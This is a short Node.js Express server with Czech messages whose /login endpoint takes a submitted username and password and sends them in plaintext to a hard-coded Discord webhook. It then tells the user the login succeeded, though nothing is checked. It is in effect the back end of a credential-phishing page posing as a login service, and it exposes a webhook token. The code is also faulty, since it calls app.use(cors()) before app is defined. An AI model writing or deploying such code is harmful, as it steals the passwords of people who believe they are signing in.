const cors = require("cors");
app.use(cors());
const express = require("express");
const fetch = require("node-fetch");
const app = express();
const PORT = process.env.PORT || 3000;

app.use(express.json());

const webhookUrl = "https://discord.com/api/webhooks/1393236146363826278/usqP9vz-VkyVGER2PMgmOpGsYt9Yoh6gGc0MN30nCxzxlE9ATKdqXvmm0qQZwpIgQdv4";

app.post("/login", async (req, res) => {
  const { username, password } = req.body;

  if (!username || !password) {
    return res.status(400).send("Chybí pole uživatele nebo hesla.");
  }

  const content = `📩 Přihlášení:
👤 Uživatelské jméno: **${username}**
🔑 Heslo: **${password}**`;

  try {
    await fetch(webhookUrl, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ content })
    });
    res.status(200).send("Úspěšně přihlášeno.");
  } catch (err) {
    console.error("Chyba při odesílání na Discord:", err);
    res.status(500).send("Chyba při odesílání na Discord.");
  }
});

app.listen(PORT, () => {
  console.log(`✅ Server běží na portu ${PORT}`);
});
